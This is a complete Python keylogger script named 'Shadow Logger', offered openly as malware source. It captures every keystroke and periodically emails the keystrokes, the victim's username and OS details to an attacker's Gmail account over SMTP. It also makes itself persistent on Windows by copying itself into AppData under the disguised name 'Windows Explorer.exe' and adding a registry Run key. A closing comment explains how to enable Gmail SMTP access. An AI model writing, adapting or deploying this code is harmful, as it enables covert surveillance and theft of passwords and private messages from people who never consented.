import pynput.keyboard
import smtplib
import threading
import platform
import getpass
import sys, os, shutil
import subprocess

class keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "KeyLogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.user_details = self.user_details()
    
    def user_details(self):
        user = platform.uname()
        Os = user[0] + user[2]
        name = getpass.getuser()
        return name + "\nOs: " + Os + "\n"
     
    def append_to_log(self, string):                
        self.log = self.log + string
    
    def process_key_press(self, key):       
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
        
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_mail(self, email, password, message):
        message = "Subject: Shadow Logger\n\n" + "From: " + self.user_details + "\nLogs: " + message               
        server = smtplib.SMTP("smtp.gmail.com", 587)       
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()
    
    def become_persistent_on_windows(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
    
    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            self.become_persistent_on_windows()
            keyboard_listener.join()
                    
logger = keylogger(300, "example@gmail.com", "password",)
logger.start()

#https://myaccount.google.com/lesssecureapps use link to use smtp server in gmail
